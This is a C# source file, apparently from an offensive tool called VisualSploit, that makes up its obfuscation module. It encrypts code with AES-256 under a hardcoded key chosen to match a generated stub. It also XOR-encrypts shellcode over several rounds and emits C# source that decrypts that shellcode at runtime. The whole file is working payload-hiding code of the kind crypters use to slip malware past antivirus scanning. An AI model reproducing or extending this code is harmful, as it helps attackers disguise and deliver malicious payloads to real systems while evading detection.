using System.Security.Cryptography;
using System.Text;

namespace VisualSploit.Obfuscation;

internal static class Aes256
{
    private const int KeySize = 32;
    private const int IvSize = 16;
    private const int Iterations = 100000;

    public static (string Encrypted, byte[] Iv) Encrypt(string code, int? seed = null)
    {
        var key = DeriveKey(seed);
        var iv = new byte[IvSize];
        using (var rng = RandomNumberGenerator.Create())
        {
            rng.GetBytes(iv);
        }

        using (var aes = Aes.Create())
        {
            ConfigureAes(aes, key, iv);

            using (var encryptor = aes.CreateEncryptor())
            using (var ms = new MemoryStream())
            {
                using (var cs = new CryptoStream(ms, encryptor, CryptoStreamMode.Write))
                {
                    var bytes = Encoding.UTF8.GetBytes(code);
                    cs.Write(bytes, 0, bytes.Length);
                }
                var encrypted = ms.ToArray();
                return (Convert.ToBase64String(encrypted), iv);
            }
        }
    }

    public static string Decrypt(string enc, byte[] iv)
    {
        var key = DeriveKey(null);
        var encrypted = Convert.FromBase64String(enc);

        using (var aes = Aes.Create())
        {
            ConfigureAes(aes, key, iv);

            using (var decryptor = aes.CreateDecryptor())
            using (var ms = new MemoryStream(encrypted))
            using (var cs = new CryptoStream(ms, decryptor, CryptoStreamMode.Read))
            using (var sr = new StreamReader(cs))
            {
                return sr.ReadToEnd();
            }
        }
    }

    private static void ConfigureAes(Aes aes, byte[] key, byte[] iv)
    {
        aes.KeySize = KeySize * 8;
        aes.Key = key;
        aes.IV = iv;
        aes.Mode = CipherMode.CBC;
        aes.Padding = PaddingMode.PKCS7;
    }

    private static byte[] DeriveKey(int? seed = null)
    {
        // Static salt - MUST match the generated stub code in Stub.GenerateKeyDerivation()
        var salt = Encoding.UTF8.GetBytes("VisualSploit.Obfuscation.Salt.v1");

        // Use 3-arg constructor (SHA1 default) to match .NET Framework runtime behavior
#pragma warning disable SYSLIB0041
        using (var pbkdf2 = new Rfc2898DeriveBytes(
            Encoding.UTF8.GetBytes("AppConfig"),
            salt,
            Iterations))
#pragma warning restore SYSLIB0041
        {
            return pbkdf2.GetBytes(KeySize);
        }
    }
}

internal static class Xor
{
    private const int MinRounds = 1;
    private const int MaxRounds = 10;
    private const int DefaultKeySize = 32;
    private const string Indent = "                  ";

    public static (byte[] Encrypted, byte[][] Keys) Encrypt(byte[] shellcode, int rounds, Random? random = null)
    {
        if (rounds < MinRounds || rounds > MaxRounds)
            throw new ArgumentException($"XOR rounds must be between {MinRounds} and {MaxRounds}", nameof(rounds));

        var keys = new byte[rounds][];
        var result = (byte[])shellcode.Clone();

        for (int i = 0; i < rounds; i++)
        {
            keys[i] = new byte[DefaultKeySize];

            if (random != null)
            {
                random.NextBytes(keys[i]);
            }
            else
            {
                using var rng = RandomNumberGenerator.Create();
                rng.GetBytes(keys[i]);
            }

            for (int j = 0; j < result.Length; j++)
                result[j] ^= keys[i][j % keys[i].Length];
        }

        return (result, keys);
    }

    public static string GenerateDecryptionCode(byte[] encryptedShellcode, byte[][] keys, Dictionary<string, string> vars)
    {
        var sb = new StringBuilder();

        var encryptedBytes = string.Join(", ", encryptedShellcode.Select(b => $"0x{b:X2}"));
        sb.AppendLine($"{Indent}var {vars["encrypted"]} = new byte[] {{ {encryptedBytes} }};");
        sb.AppendLine();

        for (int i = keys.Length - 1; i >= 0; i--)
        {
            var keyBytes = string.Join(", ", keys[i].Select(b => $"0x{b:X2}"));
            sb.AppendLine($"{Indent}var {vars[$"key{i}"]} = new byte[] {{ {keyBytes} }};");
        }
        sb.AppendLine();

        for (int i = keys.Length - 1; i >= 0; i--)
        {
            var loopVar = $"{vars["i"]}_{i}";
            var encVar = vars["encrypted"];
            var keyVar = vars[$"key{i}"];

            sb.AppendLine($"{Indent}for (int {loopVar} = 0; {loopVar} < {encVar}.Length; {loopVar}++)");
            sb.AppendLine($"{Indent}    {encVar}[{loopVar}] ^= {keyVar}[{loopVar} % {keyVar}.Length];");
            if (i > 0) sb.AppendLine();
        }

        return sb.ToString();
    }
}
